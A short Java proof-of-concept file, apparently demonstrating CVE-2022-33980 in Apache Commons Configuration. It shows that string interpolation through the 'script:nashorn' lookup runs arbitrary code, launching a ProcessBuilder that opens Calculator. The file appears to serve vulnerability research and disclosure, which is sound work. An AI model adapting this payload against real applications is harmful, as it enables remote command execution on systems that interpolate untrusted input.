package nl.brianvermeer.snyk.cve202233980;

import org.apache.commons.configuration2.interpol.ConfigurationInterpolator;
import org.apache.commons.configuration2.interpol.InterpolatorSpecification;

public class Main {

    public static void main(String[] args) {
        InterpolatorSpecification ips = new InterpolatorSpecification.Builder()
                .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups())
                .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values())
                .create();

        ConfigurationInterpolator interpolator = ConfigurationInterpolator.fromSpecification(ips);
        System.out.println(interpolator.interpolate("${script:javascript: 5 + 4}\n"));
        System.out.println(interpolator.interpolate("${script:nashorn: new java.lang.ProcessBuilder(\"open\", \"-a\", \"Calculator\").start()}"));
    }
}
